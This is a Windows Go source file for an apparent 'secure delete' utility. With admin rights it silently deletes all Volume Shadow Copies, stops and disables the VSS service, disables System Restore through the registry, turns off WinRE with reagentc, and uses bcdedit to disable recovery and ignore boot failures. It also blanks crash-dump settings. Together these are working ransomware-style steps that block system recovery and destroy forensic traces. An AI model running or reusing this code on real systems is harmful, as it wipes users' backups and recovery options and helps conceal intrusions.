//go:build windows

package utils

import (
	"os"
	"strings"
)

func init() {
	isAdminPlatform = isWindowsAdmin
	secureDeletePlatform = secureDeleteWindows
	secureDeleteSystemPlatform = secureDeleteWindowsSystem
	disableCoreDumpPlatform = disableCoreDumpWindows
}

func isWindowsAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

func disableCoreDumpWindows() {
	isAdmin := IsAdmin()
	if !isAdmin {
		PrintInfo("[Security] Core dump disabling requires Admin privileges, skipping")
		return
	}

	cmds := []struct {
		name string
		cmd  string
		args []string
	}{
		{"Set DumpFile to empty", "reg", []string{"add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl", "/v", "DumpFile", "/t", "REG_EXPAND_SZ", "/d", "\"\"", "/f"}},
		{"Disable crash dump", "reg", []string{"add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl", "/v", "CrashDumpEnabled", "/t", "REG_DWORD", "/d", "0", "/f"}},
	}

	for _, c := range cmds {
		PrintInfo("[Security] Executing: %s", c.name)
		output, err := executeCommandSilent(c.name, c.cmd, c.args)
		if err != nil {
			if strings.Contains(output, "access denied") || strings.Contains(output, "Access is denied") {
				PrintWarning("[Security] %s: Access denied", c.name)
			} else {
				PrintWarning("[Security] %s failed: %v", c.name, err)
			}
		} else {
			PrintSuccess("[Security] %s succeeded", c.name)
		}
	}
}

func secureDeleteWindows(filePath string, isAdmin bool) {
	PrintInfo("[Windows] Starting secure delete operation...")

	volume := getVolumeFromPath(filePath)
	PrintInfo("[Windows] Target volume: %s", volume)

	if isAdmin {
		PrintInfo("[Windows] Deleting VSS snapshots for volume...")
		deleteVSSByVolume(volume)

		PrintInfo("[Windows] Disabling boot repair...")
		disableBootRepair()

		PrintInfo("[Windows] Stopping VSS service...")
		stopVSSService()

		PrintInfo("[Windows] Disabling system restore...")
		disableSystemRestore(volume)

		PrintInfo("[Windows] Disabling WinRE...")
		disableWinRE()
	} else {
		PrintWarning("[Windows] Not running as administrator, skipping admin-only operations")
		PrintInfo("[Windows] Attempting to delete VSS snapshots for file...")
		deleteVSSByFile(filePath)
	}
}

func secureDeleteWindowsSystem(volume string, isAdmin bool) {
	if isAdmin {
		PrintInfo("[Windows] Deleting VSS snapshots for volume...")
		deleteVSSByVolume(volume)

		PrintInfo("[Windows] Disabling boot repair...")
		disableBootRepair()

		PrintInfo("[Windows] Stopping VSS service...")
		stopVSSService()

		PrintInfo("[Windows] Disabling system restore...")
		disableSystemRestore(volume)

		PrintInfo("[Windows] Disabling WinRE...")
		disableWinRE()
	} else {
		PrintWarning("[Windows] Not running as administrator, skipping system-level secure delete")
	}
}

func executeCommandSilent(description, cmd string, args []string) (string, error) {
	output, err := executeCommand(description, cmd, args)
	if err != nil {
		if strings.Contains(strings.ToLower(output), "access denied") {
			return output, err
		}
	}
	return output, err
}

func startVSSService() bool {
	PrintInfo("[Windows] Checking VSS service status...")
	output, err := executeCommand("Check VSS status", "sc", []string{"query", "VSS"})
	if err != nil {
		PrintWarning("[Windows] Failed to check VSS service status")
		return false
	}

	if strings.Contains(strings.ToLower(output), "running") {
		PrintInfo("[Windows] VSS service is already running")
		return true
	}

	if strings.Contains(strings.ToLower(output), "stopped") {
		PrintInfo("[Windows] VSS service is stopped, attempting to start...")
		output, err = executeCommand("Start VSS service", "net", []string{"start", "VSS"})
		if err != nil {
			if strings.Contains(strings.ToLower(output), "access denied") {
				PrintWarning("[Windows] VSS service start: Access denied")
				return false
			}
			if strings.Contains(strings.ToLower(output), "disabled") || strings.Contains(strings.ToLower(output), "start type") {
				PrintInfo("[Windows] VSS service is disabled, enabling first...")
				output, err = executeCommand("Enable VSS service", "sc", []string{"config", "VSS", "start=", "demand"})
				if err != nil {
					if strings.Contains(strings.ToLower(output), "access denied") {
						PrintWarning("[Windows] VSS service enable: Access denied")
						return false
					}
					PrintWarning("[Windows] Failed to enable VSS service: %v", err)
					return false
				}
				PrintSuccess("[Windows] VSS service enabled successfully")

				PrintInfo("[Windows] Attempting to start VSS service again...")
				output, err = executeCommand("Start VSS service", "net", []string{"start", "VSS"})
				if err != nil {
					PrintWarning("[Windows] Failed to start VSS service: %v", err)
					return false
				}
			} else {
				PrintWarning("[Windows] Failed to start VSS service: %v", err)
				return false
			}
		}
		PrintSuccess("[Windows] VSS service started successfully")
		return true
	}

	return false
}

func deleteVSSByVolume(volume string) {
	if !startVSSService() {
		PrintWarning("[Windows] VSS service is not available, skipping VSS snapshot operations")
		return
	}

	cmds := []struct {
		name string
		cmd  string
		args []string
	}{
		{"List shadow copies", "vssadmin", []string{"list", "shadows", "/for=" + volume}},
		{"Delete shadow copies", "vssadmin", []string{"delete", "shadows", "/for=" + volume, "/quiet"}},
	}

	for _, c := range cmds {
		PrintInfo("[Windows] Executing: %s", c.name)
		output, err := executeCommand(c.name, c.cmd, c.args)
		if err != nil {
			if strings.Contains(strings.ToLower(output), "access denied") {
				PrintWarning("[Windows] %s: Access denied", c.name)
			} else if strings.Contains(strings.ToLower(output), "no items found") || strings.Contains(strings.ToLower(output), "not found") {
				PrintInfo("[Windows] %s: No shadow copies found", c.name)
			} else {
				PrintWarning("[Windows] %s failed: %v", c.name, err)
			}
		} else {
			PrintSuccess("[Windows] %s succeeded", c.name)
		}
	}
}

func deleteVSSByFile(filePath string) {
	cleanPath := strings.ReplaceAll(filePath, "/", "\\")
	output, err := executeCommand("Delete VSS snapshots for file", "vssadmin", []string{"delete", "shadows", "/for=" + cleanPath, "/quiet"})
	if err != nil {
		if strings.Contains(strings.ToLower(output), "access denied") {
			PrintWarning("[Windows] VSS snapshot delete: Access denied (requires admin)")
		} else {
			PrintWarning("[Windows] Failed to delete VSS snapshots for file: %v", err)
		}
	} else {
		PrintSuccess("[Windows] Successfully deleted VSS snapshots for file")
	}
}

func disableBootRepair() {
	isAdmin := IsAdmin()
	if !isAdmin {
		PrintInfo("[Windows] Boot repair disabling requires Admin privileges, skipping")
		return
	}

	cmds := []struct {
		name string
		cmd  string
		args []string
	}{
		{"Disable boot repair", "bcdedit", []string{"/set", "{current}", "bootstatuspolicy", "ignoreallfailures"}},
		{"Disable auto repair", "bcdedit", []string{"/set", "{default}", "recoveryenabled", "no"}},
	}

	for _, c := range cmds {
		PrintInfo("[Windows] Executing: %s", c.name)
		output, err := executeCommand(c.name, c.cmd, c.args)
		if err != nil {
			if strings.Contains(strings.ToLower(output), "access denied") {
				PrintWarning("[Windows] %s: Access denied", c.name)
			} else {
				PrintWarning("[Windows] %s failed: %v", c.name, err)
			}
		} else {
			PrintSuccess("[Windows] %s succeeded", c.name)
		}
	}
}

func stopVSSService() {
	isAdmin := IsAdmin()
	if !isAdmin {
		PrintInfo("[Windows] VSS service management requires Admin privileges, skipping")
		return
	}

	cmds := []struct {
		name        string
		cmd         string
		args        []string
		ignoreError bool
	}{
		{"Stop VSS service", "net", []string{"stop", "VSS"}, true},
		{"Disable VSS service", "sc", []string{"config", "VSS", "start=", "disabled"}, false},
	}

	for _, c := range cmds {
		PrintInfo("[Windows] Executing: %s", c.name)
		output, err := executeCommand(c.name, c.cmd, c.args)
		if err != nil {
			if c.ignoreError && strings.Contains(strings.ToLower(output), "not started") {
				PrintInfo("[Windows] %s: Service not running", c.name)
			} else if strings.Contains(strings.ToLower(output), "access denied") {
				PrintWarning("[Windows] %s: Access denied", c.name)
			} else {
				PrintWarning("[Windows] %s failed: %v", c.name, err)
			}
		} else {
			PrintSuccess("[Windows] %s succeeded", c.name)
		}
	}
}

func disableSystemRestore(volume string) {
	isAdmin := IsAdmin()
	if !isAdmin {
		PrintInfo("[Windows] System restore disabling requires Admin privileges, skipping")
		return
	}

	output, err := executeCommand("Disable system restore", "reg", []string{"add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "/v", "DisableSR", "/t", "REG_DWORD", "/d", "1", "/f"})
	PrintInfo("[Windows] Executing: Disable system restore")
	if err != nil {
		if strings.Contains(strings.ToLower(output), "access denied") {
			PrintWarning("[Windows] System restore disable: Access denied")
		} else {
			PrintWarning("[Windows] Failed to disable system restore: %v", err)
		}
	} else {
		PrintSuccess("[Windows] Successfully disabled system restore")
	}

	PrintInfo("[Windows] Executing: Delete all shadow copies")
	output, err = executeCommand("Delete all shadow copies", "vssadmin", []string{"delete", "shadows", "/for=" + volume, "/quiet"})
	if err != nil {
		if strings.Contains(strings.ToLower(output), "access denied") {
			PrintWarning("[Windows] Delete shadow copies: Access denied")
		} else if strings.Contains(strings.ToLower(output), "no items found") || strings.Contains(strings.ToLower(output), "not found") {
			PrintInfo("[Windows] Delete shadow copies: No shadow copies found")
		} else {
			PrintWarning("[Windows] Failed to delete shadow copies: %v", err)
		}
	} else {
		PrintSuccess("[Windows] Successfully deleted shadow copies")
	}
}

func disableWinRE() {
	isAdmin := IsAdmin()
	if !isAdmin {
		PrintInfo("[Windows] WinRE disabling requires Admin privileges, skipping")
		return
	}

	PrintInfo("[Windows] Executing: Disable WinRE")

	cmds := []struct {
		name string
		cmd  string
		args []string
	}{
		{"Disable WinRE", "reagentc", []string{"/disable"}},
		{"Disable bootmgr recovery", "bcdedit", []string{"/set", "{bootmgr}", "recoveryenabled", "No"}},
		{"Disable current system recovery", "bcdedit", []string{"/set", "{current}", "recoveryenabled", "No"}},
		{"Disable default system recovery", "bcdedit", []string{"/set", "{default}", "recoveryenabled", "No"}},
		{"Set boot status policy", "bcdedit", []string{"/set", "{current}", "bootstatuspolicy", "ignoreallfailures"}},
	}

	for _, c := range cmds {
		PrintInfo("[Windows] Executing: %s", c.name)
		output, err := executeCommand(c.name, c.cmd, c.args)
		if err != nil {
			if strings.Contains(strings.ToLower(output), "access denied") || strings.Contains(strings.ToLower(output), "elevated") {
				PrintWarning("[Windows] %s: Access denied (requires elevated command prompt)", c.name)
			} else {
				PrintWarning("[Windows] %s failed: %v", c.name, err)
			}
		} else {
			PrintSuccess("[Windows] %s succeeded", c.name)
		}
	}

	PrintInfo("[Windows] Executing: Check WinRE status")
	checkWinREStatus()
}

func checkWinREStatus() {
	isAdmin := IsAdmin()
	if !isAdmin {
		PrintInfo("[Windows] WinRE status check requires Admin privileges, skipping")
		return
	}

	output, err := executeCommand("Check WinRE status", "reagentc", []string{"/info"})
	if err != nil {
		if strings.Contains(strings.ToLower(output), "access denied") || strings.Contains(strings.ToLower(output), "elevated") {
			PrintWarning("[Windows] WinRE status check: Access denied")
		} else {
			PrintWarning("[Windows] Failed to check WinRE status: %v", err)
		}
		return
	}

	lines := strings.Split(strings.TrimSpace(output), "\n")
	statusLine := ""
	for _, line := range lines {
		if strings.Contains(strings.ToLower(line), "windows re") && strings.Contains(strings.ToLower(line), "status") {
			statusLine = line
			break
		}
	}

	if strings.Contains(strings.ToLower(statusLine), "disabled") {
		PrintSuccess("[Windows] WinRE has been successfully disabled")
	} else if strings.Contains(strings.ToLower(statusLine), "enabled") {
		PrintWarning("[Windows] WinRE still shows as enabled")
		PrintWarning("[Windows] Note: WinRE may require a system restart to fully disable")
	} else {
		PrintInfo("[Windows] WinRE status: %s", statusLine)
	}
}
